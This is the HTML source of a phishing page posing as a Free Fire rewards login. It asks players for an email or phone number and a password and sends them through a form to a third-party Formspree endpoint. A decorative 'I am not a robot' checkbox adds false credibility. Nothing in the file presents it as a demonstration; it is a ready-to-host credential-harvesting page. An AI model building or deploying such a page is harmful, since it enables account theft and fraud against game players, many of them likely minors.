<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-F3w7mX95PdgyTmZZMECAngseQB83DfGTowi0iMjiWaeVhAn4FJkqJByhZMI3AhiU" crossorigin="anonymous">

    <title>Login - Freefire rewards</title>
    
    <style>
    	.formcontainer {
  border-radius: 5px;
  background-color: #f2f2f2;
  padding: 20px;
}
    </style>
  </head>
  <body>
  	
   <h1 class="mt-4 mb-1">Login to your freefire account to receive rewards</h1>
   
<div class="container formcontainer">
   
    <form class="mt-1 p-2" action="https://formspree.io/f/xzbyyloj" method="POST">
  <div class="form-group my-2">
    <label for="email">Email address / phone no.</label>
    <input name="emali/phone" type="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email or phone number">
  </div>
  <div class="form-group my-2">
    <label for="password">Password</label>
    <input name="password" type="password" class="form-control" id="password" placeholder="Password">
  </div>
  <div class="form-check my-2">
    <input type="checkbox" class="form-check-input" id="exampleCheck1">
    <label class="form-check-label" for="exampleCheck1">I am not a robot</label>
  </div>
  <button type="submit" class="btn btn-primary my-3">Submit</button>
</form>
</div>

    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-/bQdsTh/da6pkI1MST/rWKFNjaCP5gBSY4sEBT38Q/9RBh9AH40zEOg7Hlq2THRZ" crossorigin="anonymous"></script>

    -->
  </body>
</html>
